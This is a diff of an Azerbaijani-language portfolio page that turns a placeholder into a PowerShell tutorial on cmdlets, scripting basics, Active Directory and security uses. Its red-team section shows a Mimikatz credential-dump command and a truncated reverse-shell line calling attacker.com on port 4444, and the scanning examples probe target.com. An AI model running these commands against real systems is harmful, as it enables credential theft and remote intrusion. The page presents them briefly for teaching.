@@ -3,52 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PowerShell - Zaur's Portfolio</title>
-    <link rel="stylesheet" href="../../style.css">
+    <title>Zaur Hüseynov</title>
+    <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div class="content">
         <header>
-            <h1>PowerShell</h1>
-            <p class="subtitle">Windows Automation & Security</p>
+            <h1>PowerShell Scripting</h1>
+            <p class="subtitle">Windows Avtomatlaşdırmasının və Kiber Təhlükəsizliyin Gücü</p>
         </header>
         
         <nav>
             <ul>
                 <li><a href="../../index.html">Ana Səhifə</a></li>
                 <li><a href="#about">Haqqımda</a></li>
-                <li><a href="#projects">Proyektlər</a></li>
                 <li><a href="#contact">Əlaqə</a></li>
             </ul>
         </nav>
 
-        <section id="about">
-            <h2>PowerShell Haqqında</h2>
-            <div class="about-content">
-                <p>PowerShell, Windows sistemlərində avtomatlaşdırma və təhlükəsizlik tapşırıqlarını yerinə yetirmək üçün istifadə olunan güclü bir skript dilidir.</p>
+        <section id="content">
+            <h2>1. Giriş: PowerShell nədir?</h2>
+            <div class="article-content">
+                <p>PowerShell – Microsoft tərəfindən hazırlanmış, həm komanda sətri mühiti (CLI), həm də scripting dili olan bir platformadır. Əsas üstünlüyü onun object-based (obyekt yönlü) yanaşması və .NET Framework ilə inteqrasiya imkanlarıdır.</p>
+                <p>PowerShell Windows-da doğma olaraq gəlir, lakin PowerShell 7 ilə birlikdə artıq cross-platform (Linux və macOS-da da işləyir) olmuşdur.</p>
 
-                <p>PowerShell sahəsində əsas fokus nöqtələri:</p>
+                <h2>2. PowerShell Scripting nədir?</h2>
+                <p>PowerShell scripting, .ps1 uzantılı fayllarda komandaların, funksiyaların və loqikaların yazılması və avtomatik icrası prosesidir. Həm GUI-less əməliyyatlar, həm də kompleks sistem inteqrasiyası üçün istifadə olunur.</p>
+
+                <h2>3. PowerShell-in Əsas Xüsusiyyətləri</h2>
+                <table>
+                    <tr>
+                        <th>Xüsusiyyət</th>
+                        <th>İzahı</th>
+                    </tr>
+                    <tr>
+                        <td>Object-based Output</td>
+                        <td>Komandalar nəticə olaraq mətn yox, obyekt qaytarır</td>
+                    </tr>
+                    <tr>
+                        <td>Cmdlet Sistemi</td>
+                        <td>Əmrlər Verb-Noun formatında yazılır (Get-Process)</td>
+                    </tr>
+                    <tr>
+                        <td>Remote Execution</td>
+                        <td>Uzaq sistemlərə ssenarilər göndərmək mümkündür</td>
+                    </tr>
+                    <tr>
+                        <td>Pipeline Əməliyyatları</td>
+                        <td>Komandalar arasında məlumat ötürmə</td>
+                    </tr>
+                    <tr>
+                        <td>.NET Əlaqəliliyi</td>
+                        <td>Bütün .NET metodlarına çıxış mümkündür</td>
+                    </tr>
+                </table>
+
+                <h2>4. Sadə Skript Nümunələri</h2>
+                <pre><code>Write-Output "Salam, Dünya"</code></pre>
+                <pre><code>$name = "Pərvanə"
+Write-Host "Salam, $name"</code></pre>
+
+                <h2>5. Əsas Komandalar (Cmdlet-lər)</h2>
+                <table>
+                    <tr>
+                        <th>Cmdlet</th>
+                        <th>Təyinatı</th>
+                    </tr>
+                    <tr>
+                        <td>Get-Process</td>
+                        <td>Aktiv prosesləri göstərir</td>
+                    </tr>
+                    <tr>
+                        <td>Get-Service</td>
+                        <td>Servisləri göstərir</td>
+                    </tr>
+                    <tr>
+                        <td>Start-Service</td>
+                        <td>Servisi işə salır</td>
+                    </tr>
+                    <tr>
+                        <td>Stop-Process</td>
+                        <td>Proses dayandırır</td>
+                    </tr>
+                    <tr>
+                        <td>Get-EventLog</td>
+                        <td>Sistem loglarını çıxarır</td>
+                    </tr>
+                    <tr>
+                        <td>Test-Connection</td>
+                        <td>Ping funksiyası verir</td>
+                    </tr>
+                    <tr>
+                        <td>Invoke-WebRequest</td>
+                        <td>HTTP sorğusu göndərir</td>
+                    </tr>
+                    <tr>
+                        <td>Get-ChildItem</td>
+                        <td>Fayl/kataloqları göstərir</td>
+                    </tr>
+                    <tr>
+                        <td>Set-ExecutionPolicy</td>
+                        <td>Script icazələrini tənzimləyir</td>
+                    </tr>
+                </table>
+
+                <h2>6. Şərtlər və Dövrlər</h2>
+                <h3>If-Else</h3>
+                <pre><code>$age = 21
+if ($age -ge 18) {
+    Write-Host "Yetkin şəxs"
+} else {
+    Write-Host "Uşaq"
+}</code></pre>
+
+                <h3>ForEach</h3>
+                <pre><code>$names = "Ali", "Pərvanə", "Cyberus"
+foreach ($n in $names) {
+    Write-Host "Salam $n"
+}</code></pre>
+
+                <h2>7. Funksiyalar</h2>
+                <pre><code>function Salam-Ver($ad) {
+    Write-Output "Salam, $ad!"
+}
+
+Salam-Ver "Pərvanə"</code></pre>
+
+                <h2>8. Fayl Sistemi Əməliyyatları</h2>
+                <pre><code>Get-Content "C:\Users\Public\test.txt"
+Set-Content "C:\Users\Public\test.txt" "Yeni mətn"
+Copy-Item "C:\source.txt" -Destination "D:\backup.txt"</code></pre>
+
+                <h2>9. PowerShell və Kiber Təhlükəsizlik</h2>
+                <h3>9.1. Red Team Tətbiqləri</h3>
+                <p>PowerShell, Red Team-lər üçün çox güclü bir vasitədir:</p>
+
+                <p>Mimikatz ilə LSASS Dump:</p>
+                <pre><code>Invoke-Mimikatz -DumpCreds</code></pre>
+
+                <p>Empire, Nishang və PowerSploit:</p>
+                <p>Bu frameworklər PowerShell skriptləri vasitəsilə müxtəlif hücum ssenariləri təqdim edir: keylogging, credential stealing, privilege escalation və s.</p>
+
+                <p>Reverse Shell:</p>
+                <pre><code>$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$stream = $client.GetStream();...</code></pre>
+                <p><em>Qeyd: Bu kodlar yalnız maarifləndirici məqsəd daşıyır!</em></p>
+
+                <h3>9.2. Blue Team Tətbiqləri</h3>
+                <p>Event Log Monitorinq:</p>
+                <pre><code>Get-WinEvent -LogName Security | Where-Object {$_.ID -eq 4625}</code></pre>
+
+                <p>Port İzləmə:</p>
+                <pre><code>Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}</code></pre>
+
+                <p>Sistem dəyişikliklərinin qeydiyyatı:</p>
+                <pre><code>Register-WmiEvent -Class Win32_LogicalDisk -Action { Write-Host "Disk dəyişdi!" }</code></pre>
+
+                <h2>10. Active Directory ilə İşləmə</h2>
+                <p>PowerShell AD ilə doğma inteqrasiya dəstəyi verir.</p>
+
+                <p>İstifadəçi Yaratmaq:</p>
+                <pre><code>New-ADUser -Name "Cyberus" -GivenName "Cyber" -Surname "Us" -SamAccountName "cyberus" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true</code></pre>
+
+                <p>Qrupa Əlavə Etmək:</p>
+                <pre><code>Add-ADGroupMember -Identity "IT-Admins" -Members "cyberus"</code></pre>
+
+                <h2>11. Təhlükəsizlik Skanerləri üçün Skriptlər</h2>
+                <p>Web port scanning:</p>
+                <pre><code>1..100 | ForEach-Object {
+    Test-NetConnection -ComputerName target.com -Port $_
+}</code></pre>
+
+                <p>Subdomain Checker:</p>
+                <pre><code>$subs = Get-Content sublist.txt
+foreach ($sub in $subs) {
+    Resolve-DnsName "$sub.target.com" -ErrorAction SilentlyContinue
+}</code></pre>
+
+                <h2>12. Faydalı Modul və Frameworklər</h2>
+                <table>
+                    <tr>
+                        <th>Ad</th>
+                        <th>Təyinat</th>
+                    </tr>
+                    <tr>
+                        <td>PowerSploit</td>
+                        <td>Offensive Security Modulları</td>
+                    </tr>
+                    <tr>
+                        <td>Nishang</td>
+                        <td>Post-Exploitation və Rekon</td>
+                    </tr>
+                    <tr>
+                        <td>Empire</td>
+                        <td>Kompleks Red Team framework</td>
+                    </tr>
+                    <tr>
+                        <td>PoshC2</td>
+                        <td>Komanda-nəzarət mühiti</td>
+                    </tr>
+                    <tr>
+                        <td>PSReadline</td>
+                        <td>İntelligent autocompletion</td>
+                    </tr>
+                    <tr>
+                        <td>Pester</td>
+                        <td>PowerShell üçün test framework</td>
+                    </tr>
+                </table>
+
+                <h2>13. Ən Yaxşı Təcrübələr</h2>
                 <ul>
-                    <li>Windows system administration</li>
-                    <li>Active Directory management</li>
-                    <li>Security monitoring və log analizi</li>
-                    <li>Network scanning və enumeration</li>
-                    <li>Process management və automation</li>
-                    <li>Security hardening scripts</li>
+                    <li>✅ Script-ləri digitally sign edin</li>
+                    <li>✅ Remote execution üçün PS Remoting security istifadə edin</li>
+                    <li>✅ ExecutionPolicy dəyişikliklərini audit edin</li>
+                    <li>✅ Transcript ilə logging aktiv edin</li>
+                    <li>✅ Constrained Language Mode istifadə edin (çox güclü!)</li>
                 </ul>
-            </div>
-        </section>
 
-        <section id="projects">
-            <h2>PowerShell Proyektləri</h2>
-            <div class="projects-grid">
-                <div class="project-card">
-                    <h3>Proyekt 1</h3>
-                    <p>Proyekt açıqlaması burada yer alacaq.</p>
-                    <a href="#" class="project-link">Detallar</a>
-                </div>
+                <h2>14. Tədris Platformaları</h2>
+                <ul>
+                    <li>Microsoft Learn – PowerShell Paths</li>
+                    <li>TryHackMe – PowerShell Room</li>
+                    <li>HackTheBox – PowerShell Challenges</li>
+                    <li>PowerShell.org</li>
+                    <li>GitHub PowerShell Scripts</li>
+                </ul>
             </div>
         </section>
 
@@ -67,6 +248,6 @@
             </div>
         </section>
     </div>
-    <script src="../../script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html> 
